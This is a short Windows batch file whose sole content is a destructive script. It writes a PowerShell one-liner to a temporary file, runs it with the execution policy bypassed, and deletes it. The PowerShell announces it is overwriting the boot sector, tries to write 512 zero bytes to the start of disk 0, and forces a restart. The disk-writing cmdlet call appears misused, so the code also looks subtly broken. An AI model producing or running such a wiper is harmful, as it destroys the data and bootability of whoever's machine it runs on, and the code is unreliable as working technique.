@echo off
echo Write-Host "Overwriting boot sector..."; $Drive = (Get-Disk | Where-Object {$_.Number -eq 0}).Number; $Bytes = New-Object Byte[] 512; Set-PhysicalDisk -Number $Drive -InputObject $Bytes -Offset 0; Write-Host "Forcing restart..."; Restart-Computer -Force > temp.ps1
powershell -ExecutionPolicy Bypass -File temp.ps1
del temp.ps1
